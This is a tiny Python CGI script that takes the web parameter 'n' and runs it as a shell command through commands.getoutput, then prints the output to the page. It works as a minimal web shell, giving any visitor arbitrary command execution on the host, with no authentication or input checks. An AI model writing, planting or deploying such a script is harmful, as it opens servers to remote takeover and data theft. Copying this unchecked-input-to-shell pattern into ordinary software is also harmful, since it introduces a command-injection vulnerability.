#!/usr/bin/python

import cgi
import commands

print "Content-type:text/html"
print ""

webdata = cgi.FieldStorage()
nn = webdata.getvalue('n')

o = commands.getoutput(nn)

print "<pre>"
print o
print "</pre>"
